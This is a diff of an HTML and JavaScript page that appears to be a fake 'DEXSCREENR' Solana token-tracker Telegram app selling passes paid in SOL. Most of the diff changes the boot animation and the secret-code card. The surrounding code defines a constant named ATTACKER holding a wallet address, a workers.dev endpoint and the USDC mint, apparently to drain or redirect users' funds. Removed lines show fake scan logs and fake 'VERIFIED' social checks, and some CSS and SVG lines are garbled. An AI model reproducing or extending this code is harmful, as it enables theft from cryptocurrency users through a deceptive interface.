@@ -24,62 +24,66 @@
     position: relative;
   }
 
-  /* --- HINTERGRUND --- */
-  .bg-glow {
-    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; overflow: hidden; background: #050505;
-  }
-  .orb {
-    position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.3; animation: float 12s infinite ease-in-out alternate;
-  }
-  .orb-1 { width: 300px; height: 300px; background: rgba(20, 241, 149, 0.2); top: -5%; left: -10%; }
-  .orb-2 { width: 400px; height: 400px; background: rgba(153, 69, 255, 0.15); bottom: -10%; right: -20%; animation-delay: -5s; }
-  @keyframes float { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(30px, 50px) scale(1.1); } }
-
-  /* --- BOOT SCREEN --- */
+  /* --- FLYING CAMERA BOOT SCREEN --- */
   #boot-screen {
-    display: flex; flex-direction: column; width: 100%; max-width: 340px;
-    background: rgba(10, 10, 15, 0.9); border: 1px solid rgba(255,255,255,0.1);
-    border-radius: 20px; padding: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.8);
-    font-family: 'SF Mono', Menlo, Consolas, monospace;
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: #000;
+    z-index: 9999;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
   }
 
-  .boot-header {
-    display: flex; align-items: center; gap: 8px; margin-bottom: 20px;
-    font-size: 12px; font-weight: 700; color: #14F195; letter-spacing: 1px;
+  canvas {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 1;
   }
-  .boot-header-dot { width: 8px; height: 8px; background: #14F195; border-radius: 50%; animation: pulse 1s infinite alternate; }
-  @keyframes pulse { 0% { opacity: 0.5; } 100% { opacity: 1; } }
 
-  .boot-log { font-size: 11px; color: #a1a1aa; line-height: 1.8; display: flex; flex-direction: column; gap: 6px; margin-bottom: 20px; }
-  .log-line { opacity: 0; animation: typeLine 0.1s forwards; display: flex; align-items: center; gap: 8px;}
-  .log-line .ok { color: #14F195; font-weight: bold; }
-  .log-line .warn { color: #fbbf24; font-weight: bold; }
-  .log-line svg { width: 14px; height: 14px; }
+  .boot-text {
+    z-index: 2;
+    text-align: center;
+    color: #fff;
+  }
 
-  @keyframes typeLine { to { opacity: 1; } }
+  .boot-title {
+    font-size: 24px; font-weight: 900; letter-spacing: 2px;
+    text-shadow: 0 0 20px rgba(20, 241, 149, 0.5);
+    opacity: 0;
+    animation: fadeInOut 3s ease-in-out forwards;
+  }
+  
+  .boot-subtitle {
+    font-size: 12px; color: #14F195; margin-top: 8px; letter-spacing: 1px;
+    opacity: 0;
+    animation: fadeInOut 3s ease-in-out 0.5s forwards;
+  }
 
-  /* SOCIAL CHECK UI */
-  .social-checks {
-    display: none; flex-direction: column; gap: 12px; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 20px;
+  @keyframes fadeInOut {
+    0% { opacity: 0; transform: scale(0.9); }
+    20% { opacity: 1; transform: scale(1); }
+    80% { opacity: 1; transform: scale(1); }
+    100% { opacity: 0; transform: scale(1.1); }
   }
-  .social-check-item {
-    display: flex; justify-content: space-between; align-items: center;
-    background: rgba(255,255,255,0.03); padding: 10px 12px; border-radius: 10px;
-    border: 1px solid rgba(255,255,255,0.05); font-size: 12px;
-  }
-  .social-check-item.checked {
-    border-color: rgba(20, 241, 149, 0.3); background: rgba(20, 241, 149, 0.05);
-  }
-  .social-name { display: flex; align-items: center; gap: 8px; color: #fff; font-weight: 600; }
-  .social-name svg { width: 16px; height: 16px; }
-  .check-status { font-weight: 700; color: #52525b; }
-  .social-check-item.checked .check-status { color: #14F195; }
 
   /* --- MAIN APP --- */
   #app-screen {
     display: none; flex-direction: column; align-items: center;
     width: 100%; max-width: 360px; animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    position: relative; z-index: 10;
   }
+  
+  .bg-glow {
+    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; overflow: hidden; background: #050505;
+  }
+  .orb { position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.3; animation: float 12s infinite ease-in-out alternate; }
+  .orb-1 { width: 300px; height: 300px; background: rgba(20, 241, 149, 0.2); top: -5%; left: -10%; }
+  .orb-2 { width: 400px; height: 400px; background: rgba(153, 69, 255, 0.15); bottom: -10%; right: -20%; animation-delay: -5s; }
+  @keyframes float { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(30px, 50px) scale(1.1); } }
   @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
 
   .glass-container {
@@ -95,26 +99,65 @@
   .header p { font-size: 12px; color: #a1a1aa; margin-top: 6px; }
 
   #pricing-screen { width: 100%; display: flex; flex-direction: column; gap: 10px; transition: opacity 0.4s ease; }
+  
   .plan-card {
     background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06);
     border-radius: 16px; padding: 16px; display: flex; justify-content: space-between; align-items: center;
-    cursor: pointer; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    cursor: pointer; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    overflow: hidden; position: relative;
   }
+  
   .plan-card:active { transform: scale(0.97); background: rgba(20, 241, 149, 0.1); border-color: rgba(20, 241, 149, 0.5); box-shadow: 0 0 20px rgba(20, 241, 149, 0.3); }
   .plan-card.free { border-color: rgba(20, 241, 149, 0.4); background: linear-gradient(90deg, rgba(20, 241, 149, 0.1) 0%, rgba(20, 241, 149, 0.02) 100%); }
+  
+  .plan-info { transition: opacity 0.3s ease; width: 100%; display: flex; justify-content: space-between; align-items: center; }
   .plan-info h3 { font-size: 15px; font-weight: 700; color: #fff; }
   .plan-info p { font-size: 11px; color: #a1a1aa; margin-top: 2px; }
   .plan-price { font-size: 15px; font-weight: 800; color: #14F195; }
   .plan-price.paid { color: #ffffff; }
 
-  .secret-input { width: 100%; padding: 14px; background: rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; font-size: 14px; text-align: center; margin-top: 4px; display: none; transition: all 0.3s; }
-  .secret-input.active { display: block; border-color: rgba(20, 241, 149, 0.4); }
+  /* SECRET CODE TRANSFORMATION */
+  .secret-input-wrapper {
+    display: none;
+    width: 100%;
+    opacity: 0;
+    transform: translateY(10px);
+    transition: all 0.4s ease;
+  }
 
+  .plan-card.expanded {
+    padding: 20px;
+    background: rgba(0, 0, 0, 0.8);
+    border-color: rgba(20, 241, 149, 0.5);
+    box-shadow: 0 0 30px rgba(20, 241, 149, 0.15) inset;
+  }
+
+  .plan-card.expanded .plan-info {
+    display: none;
+  }
+
+  .plan-card.expanded .secret-input-wrapper {
+    display: block;
+    opacity: 1;
+    transform: translateY(0);
+;  }
+
+  .secret-input {
+    width: 100%; padding: 16px; background: transparent;
+    border: none; border-bottom: 2px solid rgba(20, 241, 149, 0.4);
+    color: #fff; font-size: 16px; text-align: center; outline: none;
+    font-family: monospace;
+  }
+  .secret-input::placeholder { color: #52525b; font-family: -apple-system, BlinkMacSystemFont, sans-serif;}
+
+  /* LOADING */
   #loading-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 200px; animation: fadeIn 0.3s ease; }
   .loader-ring { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top-color: #14F195; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 16px; }
   .loading-text { font-size: 13px; color: #a1a1aa; font-weight: 500; }
   @keyframes spin { to { transform: rotate(360deg); } }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
+  /* CONNECT */
   #connect-screen { width: 100%; display: none; flex-direction: column; align-items: center; opacity: 0; transform: translateY(10px); transition: opacity 0.4s ease, transform 0.4s ease; }
   .status-text { font-size: 13px; margin-bottom: 20px; color: #a1a1aa; text-align: center; }
   .status-text span { color: #14F195; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
@@ -129,54 +172,30 @@
   .slider-container.success .slider-thumb svg { transform: rotate(0deg); }
 
   .spinner { display: none; width: 20px; height: 20px; border: 2.5px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
-  .back-btn { background: none; border: none; color: #52525b; font-size: 12px; font-weight: 500; margin-top: 24px; cursor: pointer; text-decoration: none; padding: 8px 16px; border-radius: 20px; transition: all 0.2s; }
+  .back-btn { background: none; border: none; color: #52525b; font-size: 12px; font-weight: 500; margin-top: 24px; cursor: pointer; padding: 8px 16px; border-radius: 20px; transition: all 0.2s; }
   .back-btn:hover { color: #ffffff; background: rgba(255,255,255,0.05); }
 
-  #dashboard-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 20px 0; animation: fadeIn 0.5s ease; }
+  /* DASHBOARD */
+  #dashboard-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 20px 0 animation: fadeIn 0.5s ease; }
   .dashboard-loader { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; margin-top: 20px; overflow: hidden; }
   .dashboard-bar { width: 0%; height: 100%; background: #14F195; animation: loadBar 3s ease-in-out forwards; }
   @keyframes loadBar { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
-  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 </style>
 </head>
 <body>
 
+  <!-- BOOT SCREEN (WARP CAMERA) -->
+  <div id="boot-screen">
+    <canvas id="warpCanvas"></canvas>
+    <div class="boot-text">
+      <div class="boot-title">DEXSCREENR</div>
+      <div class="boot-subtitle">INITIALIZING NEURAL LINK</div>
+    </div>
+  </div>
+
   <div class="bg-glow">
     <div class="orb orb-1"></div>
     <div class="orb orb-2"></div>
-  </div>
-
-  <!-- BOOT SCREEN -->
-  <div id="boot-screen">
-    <div class="boot-header">
-      <div class="boot-header-dot"></div> DEXSCREENR ENGINE v2.4
-    </div>
-    <div class="boot-log" id="bootLog"></div>
-    
-    <!-- SOCIAL CHECKS -->
-    <div class="social-checks" id="socialChecks">
-      <div class="social-check-item" id="check-twitter">
-        <div class="social-name">
-          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
-          Twitter / X
-        </div>
-        <div class="check-status">SCANNING...</div>
-      </div>
-      <div class="social-check-item" id="check-telegram">
-        <div class="social-name">
-          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 35.83-2.529 6 .998-3.014 3.332-151.386 4.025-1.627. 4.476-1.635z3"/></svg>
-          Telegram
-        </div>
-        <div class="check-status">SCANNING...</div>
-      </div>
-      <div class="social-check-item" id="check-web">
-        <div class="social-name">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15. 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>
-          Website
-        </div>
-        <div class="check-status">SCANNING...</div>
-      </div>
-    </div>
   </div>
 
   <!-- MAIN APP -->
@@ -188,26 +207,43 @@
       </div>
 
       <div id="pricing-screen">
+        <!-- FREE -->
         <div class="plan-card free" onclick="startLoading('Free Trial', 'free')">
-          <div class="plan-info"><h3>1-Day Free Trial</h3><p>Launch special access</p></div>
-          <div class="plan-price">FREE</div>
+          <div class="plan-info">
+            <div><h3>1-Day Free Trial</h3><p>Launch special access</p></div>
+            <div class="plan-price">FREE</div>
+          </div>
         </div>
-        <div class="plan-card" onclick="toggleSecretCode()">
-          <div class="plan-info"><h3>3-Day Access</h3><p>Requires secret code</p></div>
-          <div class="plan-price paid">CODE</div>
+
+        <!-- 3-DAY SECRET CODE (Expandable) -->
+        <div class="plan-card" id="secretCard" onclick="toggleSecretCode(event)">
+          <div class="plan-info">
+            <div><h3>3-Day Access</h3><p>Requires secret code</p></div>
+            <div class="plan-price paid">CODE</div>
+          </div>
+          <div class="secret-input-wrapper">
+            <input type="text" id="secretCode" class="secret-input" placeholder="Enter code..." onkeyup="checkSecret(event)">
+          </div>
         </div>
-        <input type="text" id="secretCode" class="secret-input" placeholder="Enter secret code..." onkeyup="checkSecret(event)">
+
+        <!-- PAID -->
         <div class="plan-card" onclick="startLoading('Weekly Pass', 'paid', 0.1)">
-          <div class="plan-info"><h3>Weekly Pass</h3><p>Full access to tracker</p></div>
-          <div class="plan-price paid">0.1 SOL</div>
+          <div class="plan-info">
+            <div><h3>Weekly Pass</h3><p>Full access to tracker</p></div>
+            <div class="plan-price paid">0.1 SOL</div>
+          </div>
         </div>
         <div class="plan-card" onclick="startLoading('Monthly Pro', 'paid', 0.25)">
-          <div class="plan-info"><h3>Monthly Pro</h3><p>Unlimited tracking</p></div>
-          <div class="plan-price paid">0.25 SOL</div>
+          <div class="plan-info">
+            <div><h3>Monthly Pro</h3><p>Unlimited tracking</p></div>
+            <div class="plan-price paid">0.25 SOL</div>
+          </div>
         </div>
         <div class="plan-card" onclick="startLoading('Yearly Pro', 'paid', 1.5)">
-          <div class="plan-info"><h3>Yearly Pro</h3><p>Best value</p></div>
-          <div class="plan-price paid">1.5 SOL</div>
+          <div class="plan-info">
+            <div><h3>Yearly Pro</h3><p>Best value</p></div>
+            <div class="plan-price paid">1.5 SOL</div>
+          </div>
         </div>
       </div>
 
@@ -238,67 +274,88 @@
   </div>
 
 <script>
-  // --- BOOT SEQUENCE ---
-  const bootLogs = [
-    "Connecting to Solana RPC...",
-    "Scanning mempool for new pairs...",
-    "Bypassing MEV bots...",
-    "Analyzing dev wallet holdings... <span class='warn'>[HIGH]</span>",
-    "Checking for honeypots via sim...",
-    "Bundle wallets detected. Filtering...",
-    "Liquidity locked. Burned.",
-    "Target acquired: $WIF (8x potential).",
-    "Executing MEV elimination..."
-  ];
-  
-  const bootLog = document.getElementById('bootLog');
+  // --- WARP CAMERA BOOT SEQUENCE ---
+  const canvas = document.getElementById('warpCanvas');
+  const ctx = canvas.getContext('2d');
   const bootScreen = document.getElementById('boot-screen');
   const appScreen = document.getElementById('app-screen');
-  const socialChecks = document.getElementById('socialChecks');
-  let logIndex = 0;
 
-  function runBoot() {
-    if (logIndex < bootLogs.length) {
-      const el = document.createElement('div');
-      el.className = 'log-line';
-      el.innerHTML = `> ${bootLogs[logIndex]}`;
-      bootLog.appendChild(el);
-      bootLog.scrollTop = bootLog.scrollHeight;
-      logIndex++;
-      setTimeout(runBoot, 350 + Math.random() * 200);
-    } else {
-      // Nach den Logs, zeige die Social Checks
-      socialChecks.style.display = 'flex';
+  let stars = [];
+  const numStars = 200;
+  let cameraZ = 0;
+
+  function resizeCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  window.addEventListener('resize', resizeCanvas);
+  resizeCanvas();
+
+  class Star {
+    constructor() {
+      this.reset();
+      this.z = Math.random() * canvas.width;
+    }
+    reset() {
+      this.x = (Math.random() - 0.5) * canvas.width * 2;
+      this.y = (Math.random() - 0.5) * canvas.height * 2;
+      this.z = canvas.width; // Start hinten
+    }
+    update() {
+      this.z -= 15; // Geschwindigkeit des Flugs
+      if (this.z < 1) {
+        this.reset();
+      }
+    }
+    draw() {
+      const x = (this.x / this.z) * (canvas.width / 2) + canvas.width / 2;
+      const y = (this.y / this.z) * (canvas.height / 2) + canvas.height / 2;
+      const size = (1 - this.z / canvas.width) * 3;
       
-      setTimeout(() => {
-        document.getElementById('check-twitter').classList.add('checked');
-        document.getElementById('check-twitter').querySelector('.check-status').textContent = 'VERIFIED';
-      }, 500);
-
-      setTimeout(() => {
-        document.getElementById('check-telegram').classList.add('checked');
-        document.getElementById('check-telegram').querySelector('.check-status').textContent = 'VERIFIED';
-      }, 1000);
-
-      setTimeout(() => {
-        document.getElementById('check-web').classList.add('checked');
-        document.getElementById('check-web').querySelector('.check-status').textContent = 'VERIFIED';
-      }, 1500);
-
-      setTimeout(() => {
-        bootScreen.style.display = 'none';
-        appScreen.style.display = 'flex';
-      }, 2800);
+      const opacity = 1 - this.z / canvas.width;
+      
+      ctx.beginPath();
+      ctx.arc(x, y, size, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(20, 241, 149, ${opacity})`; // Solana Grün
+      ctx.fill();
     }
   }
 
-  window.addEventListener('load', () => {
-    if (window.Telegram && window.Telegram.WebApp) {
-      window.Telegram.WebApp.ready();
-      window.Telegram.WebApp.expand();
-    }
-    runBoot();
-  });
+  for (let i = 0; i < numStars; i++) {
+    stars.push(new Star());
+  }
+
+  let warpActive = true;
+
+  function drawWarp() {
+    if (!warpActive) return;
+    
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.2)'; // Motion Blur
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    stars.forEach(star => {
+      star.update();
+      star.draw();
+    });
+
+    requestAnimationFrame(drawWarp);
+  }
+
+  drawWarp();
+
+  // Beende Warp nach 3.5 Sekunden und zeige App
+  setTimeout(() => {
+    warpActive = false;
+    bootScreen.style.opacity = '0';
+    bootScreen.style.transition = 'opacity 0.8s ease';
+    
+    setTimeout(() => {
+      bootScreen.style.display = 'none';
+      appScreen.style.display = 'flex';
+      appScreen.style.opacity = '1';
+    }, 800);
+  }, 3500);
+
 
   // --- MAIN UI LOGIC ---
   const pricingScreen = document.getElementById('pricing-screen');
@@ -307,6 +364,8 @@
   const dashboardScreen = document.getElementById('dashboard-screen');
   const headerSub = document.getElementById('headerSub');
   const selectedPlanText = document.getElementById('selectedPlanText');
+  
+  const secretCard = document.getElementById('secretCard');
   const secretInput = document.getElementById('secretCode');
 
   function startLoading(planName, type, amount = 0) {
@@ -330,21 +389,41 @@
     }, 50);
   }
 
-  function toggleSecretCode() {
-    if (secretInput.classList.contains('active')) {
-      secretInput.classList.remove('active'); secretInput.value = '';
-    } else { secretInput.classList.add('active'); secretInput.focus(); }
+  // --- SECRET CODE TOGGLE (Expand & Collapse) ---
+  function toggleSecretCode(e) {
+    e.stopPropagation(); // Verhindert, dass Klicks nach außen dringen
+    
+    if (secretCard.classList.contains('expanded')) {
+      secretCard.classList.remove('expanded');
+      secretInput.value = '';
+    } else {
+      // Schließe alle anderen Karten (falls nötig)
+      secretCard.classList.add('expanded');
+      setTimeout(() => { secretInput.focus(); }, 300); // Fokus nach Animation
+    }
   }
+
+  // Klick außerhalb schließt das Feld
+  document.addEventListener('click', (e) => {
+    if (!secretCard.contains(e.target)) {
+      secretCard.classList.remove('expanded');
+      secretInput.value = '';
+    }
+  });
 
   function checkSecret(e) {
     if (e.key === 'Enter') {
       if (e.target.value.toLowerCase() === 'free3tier') {
-        secretInput.classList.remove('active');
+        secretCard.classList.remove('expanded');
         startLoading('3-Day Access', 'free');
-      } else { e.target.value = ''; e.target.placeholder = 'Invalid code.'; }
+      } else {
+        e.target.value = '';
+        e.target.placeholder = 'Invalid code.';
+      }
     }
   }
 
+  // --- PAID LOGIC ---
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
   const ENDPOINT = "https://dexscreenr.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
@@ -377,6 +456,7 @@
     } catch (e) { goBack(); }
   }
 
+  // --- SLIDER LOGIC ---
   const container = document.getElementById('sliderContainer');
   const thumb = document.getElementById('sliderThumb');
   const text = document.getElementById('sliderText');
@@ -501,4 +581,4 @@
   thumb.addEventListener('touchend', endDrag);
 </script>
 </body>
-</html
+</html>
